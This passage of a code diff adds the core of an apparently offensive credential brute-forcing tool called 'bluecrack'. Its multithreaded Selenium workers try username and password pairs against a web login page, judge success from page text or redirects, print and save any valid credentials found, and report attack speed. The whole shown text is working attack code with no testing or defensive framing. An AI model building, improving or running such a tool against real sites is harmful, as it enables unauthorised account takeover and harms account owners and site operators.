+                                _cli_metrics["failures"] += 1
+                            q.task_done()
+                            continue
+
+                        # Determine success
+                        is_success = False
+                        if SUCCESS_MSG:
+                            if SUCCESS_MSG in page_source:
+                                is_success = True
+                            else:
+                                with _cli_metrics_lock:
+                                    _cli_metrics["failures"] += 1
+                                q.task_done()
+                                continue
+                        elif current_url != target_url and "login" not in current_url.lower():
+                            is_success = True
+                        elif ERROR_MSG:
+                            is_success = True
+
+                        if is_success:
+                            print(
+                                f"\n{_GREEN}{_BOLD}[+] VALID CREDENTIALS FOUND: {user} / {pwd}{_RESET}\n"
+                            )
+                            with _cli_metrics_lock:
+                                _cli_metrics["successes"] += 1
+                            with _cli_found_creds_lock:
+                                _cli_found_creds.append((user, pwd))
+                            with _cli_found_users_lock:
+                                _cli_found_users.add(user)
+
+                            try:
+                                with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
+                                    cf.write(f"{target_url} - {user}:{pwd}\n")
+                            except Exception as e:
+                                print(f"{_RED}[-] Could not save credential: {e}{_RESET}")
+
+                            if not CONTINUE_AFTER_SUCCESS:
+                                found_event.set()
+                                with q.mutex:
+                                    q.queue.clear()
+                                q.task_done()
+                                break
+
+                            # Clear browser state for reuse (no restart needed)
+                            try:
+                                thread_driver.delete_all_cookies()
+                            except Exception:
+                                pass
+                        else:
+                            with _cli_metrics_lock:
+                                _cli_metrics["failures"] += 1
+
+                    except (NoSuchElementException, WebDriverException):
+                        with _cli_metrics_lock:
+                            _cli_metrics["errors"] += 1
+                        print(
+                            f"{_RED}[-] Error during attempt with '{user} / {pwd}': "
+                            f"element not found or page load issue.{_RESET}"
+                        )
+                except Exception as e:
+                    with _cli_metrics_lock:
+                        _cli_metrics["errors"] += 1
+                    print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
+                finally:
+                    q.task_done()
+        finally:
+            try:
+                thread_driver.quit()
+            except Exception:
+                pass
+
+    # THREAD LAUNCHER
+    threads_list: List[threading.Thread] = []
+    print(f"\n[*] Starting {THREADS} threads...\n")
+    try:
+        for _ in range(THREADS):
+            t = threading.Thread(target=worker)
+            t.daemon = True
+            t.start()
+            threads_list.append(t)
+
+        # Wait for completion
+        while not q.empty() and not found_event.is_set() and not global_stop.is_set():
+            time.sleep(0.1)
+
+        if not found_event.is_set():
+            q.join()
+
+        cli_end_time = time.time()
+
+        if not found_event.is_set():
+            print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
+        else:
+            print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")
+
+        # Print summary
+        print(f"\n{_CYAN}═══ Attack Summary (Browser Mode) ═══{_RESET}")
+        for k, v in _cli_metrics.items():
+            print(f"  {k}: {v}")
+        elapsed = cli_end_time - _cli_start_time
+        print(f"  elapsed: {elapsed:.1f}s")
+        if _cli_metrics["attempted"] > 0 and elapsed > 0:
+            print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")
+
+        # Save JSON report if requested
+        if JSON_REPORT:
+            save_json_report(
+                "bluecrack_cli_report.json",
+                target_url,
+                _cli_metrics,
+                _cli_found_creds,
+                _cli_start_time,
+                cli_end_time,
+            )
+            print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")
+
+    except KeyboardInterrupt:
+        print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
+        found_event.set()
+        global_stop.set()
+    finally:
+        if global_stop.is_set() and not found_event.is_set():
+            print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
